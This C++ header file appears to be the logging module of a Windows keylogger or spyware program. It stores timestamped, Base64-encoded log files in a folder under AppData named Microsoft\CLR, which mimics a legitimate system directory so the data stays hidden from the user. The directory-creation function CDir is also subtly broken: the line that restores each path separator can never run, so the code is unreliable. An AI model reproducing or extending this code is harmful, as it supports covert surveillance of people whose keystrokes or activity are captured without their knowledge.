#ifndef IO_H
#define IO_H

#include "General.h"
#include "Encrypt.h"
#include "windows.h"
#include <string>
#include <cstdlib>
#include <fstream>

namespace IO
{
    std::string GetOurPath(const bool append_seperator = false)
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_seperator ? "\\" : "");
    }

    bool MkDir(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool CDir(std::string path)
    {
        for(char &c : path)
            if(c == '\\')
        {
            c = '\0';
            if (!MkDir(path))
            {
                return false;
            c = '\\';
            }
        }
    return true;
    }

    template <class T>
    std::string GenerateLog(const T &t)
    {
        std::string path = GetOurPath(true);
        General::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";

        try
        {
            std::ofstream file(path + name); //..AppData/Microsoft/CLR/ DateTIme.log
            if(!file) return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" <<
            std::endl << t << std::endl;
            std::string data = Base_64::Encrypt(s.str());
            file << data;
            if(!file)
                return "";
            file.close();
            return name;
        }
        catch(...)
        {
           return "";
        }
    }
}
#endif // IO_H
